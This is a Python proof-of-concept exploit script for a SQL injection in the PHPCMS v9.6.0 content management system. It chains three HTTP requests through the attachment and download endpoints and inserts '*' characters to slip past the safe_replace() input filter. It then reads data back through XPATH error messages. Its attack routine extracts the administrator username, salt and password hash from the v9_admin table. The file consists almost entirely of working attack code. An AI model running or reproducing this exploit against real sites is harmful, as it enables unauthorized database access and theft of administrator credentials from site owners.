#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
phpcmsv9.6.0 sqli verify and attach poc
"""

import requests
import re
from urllib import quote

TIMEOUT = 3


def poc(url,payload):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')

    # use "*" to bypass filter "safe_replace()" in PHPCMS
    #payload = "&id=%*27 and updat*exml(1,con*cat(1,(us*er())),1)%23&modelid=1&catid=1&m=1&f="
    
    cookies = {}
    #print 'step1'
    step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
    #print 'step1',step1
    for c in requests.get(step1, timeout=TIMEOUT).cookies:
        if c.name[-7:] == '_siteid':
            cookie_head = c.name[:6]
            cookies[cookie_head + '_userid'] = c.value
            cookies[c.name] = c.value
            break
    else:
        return False
    
    step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, quote(payload))
    #print 'step2:',step2,cookies
    for c in requests.get(step2, cookies=cookies, timeout=TIMEOUT).cookies:
        if c.name[-9:] == '_att_json':
            enc_payload = c.value
            break
    else:
        return False

    #print c
    step3 = url + '/index.php?m=content&c=down&a_k=' + enc_payload
    #print 'step3:',step3
    r = requests.get(step3, cookies=cookies, timeout=TIMEOUT)
    result = re.findall('XPATH syntax error: \'(.*?)\'', r.content)
    if result[0]:
        return result[0]


def verify(url):
    print 'verify poc start'
    payload = "&id=%*27 and updatexml(1,concat(1,(select user())),1)%23&modelid=1&catid=1&m=1&f="
    print poc(url,payload)


def attack(url):
    print 'attach poc start'
    payload = "&id=%*27 and updatexml(1,concat(1,(select concat(username,0x3a,encrypt) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f="
    username,salt = poc(url,payload).split(':')
    payload = "&id=%*27 and updatexml(1,concat(1,(select concat(0x3a,password) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f="
    password1 = poc(url,payload)
    payload = "&id=%*27 and updatexml(1,concat(1,(select concat(password) from v9_admin)),1)%23&modelid=1&catid=1&m=1&f="
    password2 = poc(url,payload)[-1]
    print 'username:',username
    print 'password:',password1+password2
    print 'salt:',salt
if __name__ == '__main__':
    #print poc('http://localhost/')
    verify('http://localhost/')